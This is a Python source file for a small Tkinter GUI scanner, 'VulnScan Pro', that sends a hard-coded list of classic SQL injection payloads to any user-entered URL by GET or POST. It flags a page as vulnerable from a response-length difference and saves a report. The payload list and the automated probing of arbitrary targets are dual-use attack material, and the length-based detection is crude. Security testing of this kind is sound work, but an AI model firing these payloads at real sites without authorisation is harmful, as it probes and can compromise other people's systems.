import requests
import tkinter as tk
from tkinter import messagebox, scrolledtext

# Payloads
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' OR ''='",
    "' OR 1=1#"
]

def scan():
    url = entry_url.get()
    method = method_var.get()

    if not url:
        messagebox.showerror("Error", "Enter a valid URL")
        return

    result_text.delete(1.0, tk.END)
    result_text.insert(tk.END, f"[+] Scanning: {url}\n\n", "info")

    vulnerable = False

    try:
        # Normal response
        if method == "GET":
            normal_response = requests.get(url)
        else:
            normal_response = requests.post(url, data={"input": "test"})

        normal_length = len(normal_response.text)

        for payload in payloads:
            if method == "GET":
                test_url = url + payload
                response = requests.get(test_url)
            else:
                response = requests.post(url, data={"input": payload})

            test_length = len(response.text)

            if abs(normal_length - test_length) > 50:
                result_text.insert(
                    tk.END,
                    f"[!!!] SQL Injection Detected!\nPayload: {payload}\n\n",
                    "vuln"
                )
                vulnerable = True

    except Exception as e:
        result_text.insert(tk.END, f"Error: {e}\n", "error")

    if not vulnerable:
        result_text.insert(
            tk.END,
            "[-] No SQL Injection vulnerability detected.\n",
            "safe"
        )

    save_report(url, result_text.get(1.0, tk.END))


def save_report(url, content):
    with open("report.txt", "w") as file:
        file.write(f"Scan Report for {url}\n\n")
        file.write(content)


# GUI Setup
root = tk.Tk()
root.title("VulnScan Pro - SQL Injection Detector")
root.geometry("700x500")
root.configure(bg="#0f172a")  # Dark background

# Title
title = tk.Label(root, text="SQL Injection Scanner", font=("Arial", 18, "bold"), fg="#38bdf8", bg="#0f172a")
title.pack(pady=10)

# URL Input
tk.Label(root, text="Target URL:", fg="white", bg="#0f172a").pack()
entry_url = tk.Entry(root, width=70, bg="#1e293b", fg="white", insertbackground="white")
entry_url.pack(pady=5)

# Method Dropdown
tk.Label(root, text="Method:", fg="white", bg="#0f172a").pack()
method_var = tk.StringVar(value="GET")
tk.OptionMenu(root, method_var, "GET", "POST").pack(pady=5)

# Scan Button
scan_btn = tk.Button(root, text="Start Scan", command=scan, bg="#38bdf8", fg="black", width=20)
scan_btn.pack(pady=10)

# Result Box
result_text = scrolledtext.ScrolledText(root, height=15, width=80, bg="#020617", fg="white")
result_text.pack(pady=10)

# Color tags
result_text.tag_config("vuln", foreground="red")
result_text.tag_config("safe", foreground="green")
result_text.tag_config("info", foreground="cyan")
result_text.tag_config("error", foreground="orange")

root.mainloop()